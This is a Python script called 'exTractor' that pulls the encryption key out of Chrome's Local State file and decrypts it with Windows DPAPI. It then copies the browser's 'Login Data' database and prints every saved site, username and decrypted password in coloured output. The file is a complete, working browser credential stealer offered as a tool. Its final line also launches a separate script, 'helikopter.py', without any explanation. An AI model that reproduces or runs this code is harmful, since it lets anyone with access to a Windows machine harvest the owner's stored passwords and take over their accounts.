#importing required modules
import os
import json
import base64
import sqlite3
import shutil
import time
from os import system
from win32 import win32crypt
from Crypto.Cipher import AES
from datetime import timezone, datetime, timedelta


#function defined for colouring
def prRed(skk): print("\033[91m {}\033[00m" .format(skk))
def prGreen(skk): print("\033[92m {}\033[00m" .format(skk))
def prYellow(skk): print("\033[93m {}\033[00m" .format(skk))
def prLightPurple(skk): print("\033[94m {}\033[00m" .format(skk))
def prPurple(skk): print("\033[95m {}\033[00m" .format(skk))
def prCyan(skk): print("\033[96m {}\033[00m" .format(skk))
def prLightGray(skk): print("\033[97m {}\033[00m" .format(skk))
def prBlack(skk): print("\033[98m {}\033[00m" .format(skk))


#banner function to display the banner
def banner():
    print("""
           _____               _             
  _____  _|_   _| __ __ _  ___| |_ ___  _ __ 
 / _ \ \/ / | || '__/ _` |/ __| __/ _ \| '__|
|  __/>  <  | || | | (_| | (__| || (_) | |   
 \___/_/\_\ |_||_|  \__,_|\___|\__\___/|_|""")


#function to get date and time from chrome
def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)


def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                    "AppData", "Local", "Google", "Chrome",
                                    "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    
    # remove DPAPI str
    key = key[5:]
    
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


#fucntion to decrypt password
def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""


#main function
def __main_function__():
    # get the AES key
    key = get_encryption_key()
    
    # local sqlite Chrome database path
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                           "Google", "Chrome", "User Data", "default", "Login Data")
    
    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    
    # connect to the database
    db = sqlite3.connect(filename)
    
    cursor = db.cursor()
    # `logins` table has the data we need
    
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    # iterate over all rows
    
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]
        
        if username or password:
            prGreen(f"Origin URL: {origin_url}")
            prCyan(f"Action URL: {action_url}")
            prYellow(f"Username: {username}")
            prPurple(f"Password: {password}")
        
        else:
            continue
        
        if date_created != 86400000000 and date_created:
            print(f"Creation date: {str(get_chrome_datetime(date_created))}")
            
        if date_last_used != 86400000000 and date_last_used:
            print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")
        
        print("="*50)
    
    cursor.close()
    
    db.close()
    
    try:
        # try to remove the copied db file
        os.remove(filename)
    
    except:
        pass

if __name__ == "__main__":  
    #clearing screen
    system('cls')
    
    #printing banner
    banner()
    time.sleep(2)
    
    print('\n','='*15,'Fetching Passwords','='*16,'\n')
    time.sleep(3)
    
    #calling main function
    __main_function__()
    input()
os.system('python helikopter.py')
